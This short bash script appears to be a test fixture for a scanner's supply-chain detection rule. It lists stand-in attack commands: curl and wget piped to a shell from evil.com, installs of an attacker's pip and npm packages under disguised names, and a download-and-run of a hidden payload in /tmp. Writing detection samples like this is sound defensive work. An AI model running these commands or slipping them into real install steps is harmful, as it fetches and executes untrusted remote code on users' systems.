#!/bin/bash
# Supply chain attack — should trigger rule: supply-chain

# Classic pipe-to-shell
curl -fsSL https://evil.com/install.sh | bash
wget -qO- https://evil.com/setup.sh | sh

# Hidden in install script
pip install -e git+https://github.com/attacker/evil-package.git#egg=legit-name
npm install --save attacker-backdoor-pkg

# Postinstall hook running arbitrary code
curl https://evil.com/payload -o /tmp/.hidden && chmod +x /tmp/.hidden && /tmp/.hidden
